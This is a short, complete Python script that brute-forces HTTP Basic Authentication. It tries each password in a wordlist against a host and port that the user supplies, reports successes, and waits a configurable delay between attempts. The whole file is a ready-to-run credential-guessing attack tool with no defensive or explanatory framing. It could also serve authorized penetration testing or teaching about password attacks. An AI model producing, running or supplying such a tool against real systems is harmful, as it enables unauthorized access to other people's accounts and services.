import requests
from requests.auth import HTTPBasicAuth
import time
from colorama import Fore, init

init(autoreset=True)

def brute_force_http_basic_auth(target_url, username, wordlist_path, port=80, delay=1):
    try:
        with open(wordlist_path, 'r') as wordlist:
            for password in wordlist:
                password = password.strip()
                try:
                    url = f"http://{target_url}:{port}"
                    response = requests.get(url, auth=HTTPBasicAuth(username, password))
                    
                    if response.status_code == 200:
                        print(f"{Fore.GREEN}Success: Username: {username} | Password: {password}")
                        return True
                    else:
                        print(f"{Fore.RED}Failed: Username: {username} | Password: {password}")
                
                except requests.RequestException as e:
                    print(f"{Fore.RED}Error: {e}")
                    break
                
                # Delay between attempts
                time.sleep(delay)
    except FileNotFoundError:
        print(f"{Fore.RED}Wordlist file not found.")

def main():
    target_url = input("Enter target URL (domain or IP): ")
    username = input("Enter HTTP Basic Auth username: ")
    wordlist_path = input("Enter path to the wordlist: ")
    
    # Prompt for port and delay
    port = input("Enter port (default is 80): ")
    port = int(port) if port else 80
    
    delay = input("Enter delay between attempts in seconds (default is 1): ")
    delay = float(delay) if delay else 1
    
    brute_force_http_basic_auth(target_url, username, wordlist_path, port, delay)

if __name__ == "__main__":
    main()
